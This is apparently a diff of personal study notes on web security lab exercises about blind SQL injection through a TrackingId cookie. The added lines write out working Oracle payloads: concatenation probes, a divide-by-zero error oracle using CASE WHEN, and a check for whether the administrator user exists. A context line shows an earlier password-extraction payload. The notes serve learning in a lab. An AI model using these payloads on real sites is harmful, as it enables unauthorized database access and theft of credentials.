@@ -1,8 +1,8 @@
 1. Make the database retrieve the string: 'tWGj2h'; Find the column containing string
 2. Retrieve data from other tables. Find users table and look for administrator password. 
 3. Retreive multiple values in a single column. 
-4. Blind SQL injection with conditional responses. Find injection vector, conditional response will respond true or false. 
-5. Blind SQL injection with conditional errors. 
+4. Blind SQL injection with conditional responses. Find injection vector, conditional response will respond true or false. Response was Welbcome Back
+5. Blind SQL injection with conditional errors. If the SQL query causes an error, then the application returns a custom error message. 
 
 
 
@@ -56,3 +56,22 @@ Cookie: TrackingId=aaaaaaaaaaaa' AND (SELECT (SELECT SUBSTRING(password,1,1) FRO
     Ensure you have both Add S and the first one is the first payload, iterates first payload 1-20 with a, then 1-20 with b.
   
   5. 
+Let's validate our injection point 
+TrackingId=aaaaaaaaaaaaaaaaaaaaa' --; No error, count the word error on the page, or just look at page response 500 or not. I thought would be more challenging. But 500 is sufficient.
+' AND (SELECT 'a' FROM users1 WHERE username1='administrator111')='a; table and user validation. I only get errors if selecting wrong table, or column but not if wrong username. 
+Off on the wrong track and couldn't progress had to get hints from the lab page. But Why...?
+TrackingId=xyz'||(SELECT '')||';    TrackingId=xyz'||(SELECT '' FROM dual)||'; TrackingId=xyz'||(SELECT '' FROM dual1)||'; validate error page expected for guide and Oracle.
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'; validate users
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Validate that this does give us an error page.Case 1=1 so evaulaute 1/0 divide by zero error
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; This does not give us an error page, do not evaluate 1/0 becasue 1!=2
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual1)||'; This would also not present and error. 
+The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true. 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; If you get an error then admin exists. 
+Is there a simpler method to find users? This is good lessons but COME ON MAN!
+'||(SELECT 'a' FROM users WHERE username='administrator')||'; Would not work for username value as before the complex methdo is required. 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' When user exist error, error when true statement before and after must be true for 1/0 to cause error
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1')||' When user does not exist no error, When where doesn't evalaute is kind of like case 1=2, can
+t do
+
+
+
